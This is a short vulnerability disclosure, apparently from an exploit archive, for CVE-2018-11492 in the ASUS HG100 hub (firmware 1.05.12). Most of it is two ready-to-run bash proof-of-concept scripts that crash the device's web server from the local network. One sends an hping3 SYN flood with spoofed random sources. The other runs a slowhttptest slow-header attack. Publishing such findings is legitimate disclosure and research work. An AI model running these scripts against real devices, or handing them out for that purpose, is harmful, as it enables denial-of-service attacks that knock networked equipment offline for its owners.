# Vendor Homepage: www.asus.com
# Version: Hardware version: HG100 、Firmware version:  1.05.12
# Tested on: Currnet 1.05.12
# CVE : CVE-2018-11492

1. Description
The attack at same Local-Network-area could crash the device via the Hping3 or Slowhttptest(which is not include in the CVE-2018-11492).

2.Proof of Concept
Just Execute the following script in kali which could crash the devices

    1. IPv4 packet and in result of devices crash.which written in linux script.

        #needed to co-operate with hping3 tool
        #with the time period at least 220s which could cause web server of HG100 devices crash
        #!/bin/bash
        read -p "enter the ip of HG100 here " url
        hping3 -V -c 10000 -S -w 64 --flood --rand-source $url
        sleep 220
        echo "Hping3 –V –c 10000 –S –w 64 –flood –rand-source $url time 220s"
        exit 0

    2.Slowhttp test and caused the devices crash.which written in linux script.

        #needed to co-operate with slowhttptest tool
        #with the time period 600s which could cause web server of HG100 devices crash
        #!/bin/bash
        read -p "enter the ip of HG100 with port here ex: http://x.x.x.x:123 " url
        slowhttptest -H -R -c 10000 -l 600 -u $url
        sleep 600
        echo "slowhttptest -H -R -c 10000 -l 600 -u $url time 600s"
        exit 0
